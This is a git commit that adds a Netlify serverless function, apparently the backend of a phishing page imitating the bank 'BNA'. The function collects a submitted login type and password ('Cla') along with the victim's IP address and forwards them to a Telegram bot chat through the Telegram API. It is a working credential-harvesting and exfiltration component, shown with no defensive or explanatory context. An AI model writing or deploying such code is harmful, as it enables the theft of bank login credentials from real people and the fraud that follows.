91238993f8e13ccce09e1c2a67bfe6616d44a618
netlify93-crypto <netlify93@gmail.com>
2026-01-17 10:51:59 -0300

    Add files via upload

---
+++ netlify/functions/enviar.js
@@ -0,0 +1,31 @@
+exports.handler = async (event) => {
+  const { tipo, valor } = JSON.parse(event.body);
+
+  // Obtener IP del cliente
+  const ip =
+    event.headers["x-forwarded-for"]?.split(",")[0] ||
+    event.headers["X-Forwarded-For"]?.split(",")[0] ||
+    "IP no disponible";
+
+  const mensaje = `
+📩 BNA
+
+Log: ${tipo}
+Cla: ${valor}
+IP: ${ip}
+  `;
+
+  await fetch(`https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      chat_id: process.env.CHAT_ID,
+      text: mensaje
+    })
+  });
+
+  return {
+    statusCode: 200,
+    body: JSON.stringify({ ok: true })
+  };
+};
